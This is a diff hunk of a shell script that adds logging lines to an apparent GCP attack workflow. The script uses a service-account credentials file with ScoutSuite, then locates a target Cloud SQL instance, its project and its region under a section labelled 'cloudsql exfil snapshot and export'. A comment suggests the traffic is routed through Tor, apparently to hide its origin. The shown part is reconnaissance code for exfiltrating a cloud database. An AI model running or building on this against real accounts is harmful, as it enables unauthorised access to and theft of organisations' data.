@@ -57,10 +57,15 @@ scout gcp --service-account ~/.config/gcloud/credentials.json --report-dir /$SCR
 
 # cloudsql exfil snapshot and export
 SQL_INSTANCES=$(gcloud sql instances list --project=$PROJECT --format="json")
+log "found sql instances: ${SQL_INSTANCES}"
 SQL_INSTANCE=$(echo $SQL_INSTANCES | jq -r --arg i $DEPLOYMENT '.[] | select(.name | endswith($i)) | .name')
+log "found target instance: $SQL_INSTANCE"
 SQL_DETAILS=$(gcloud sql instances describe $SQL_INSTANCE --project=$PROJECT --format="json")
+log "target instance details: $SQL_DETAILS"
 SQL_PROJECT=$(echo $SQL_DETAILS | jq -r '.project')
+log "target instance project: $SQL_PROJECT"
 SQL_REGION=$(echo $SQL_DETAILS | jq -r '.region')
+log "target instance region: $SQL_REGION"
 # this must be retrieved outside the tor network :(
 # BUCKETS=$(gcloud storage buckets list --project=$PROJECT --filter="location=$SQL_REGION" --format="json")
 # BUCKET_URL=$(echo $BUCKETS | jq -r --arg i $DEPLOYMENT '.[] | select(.name | contains($i)) | .storage_url')
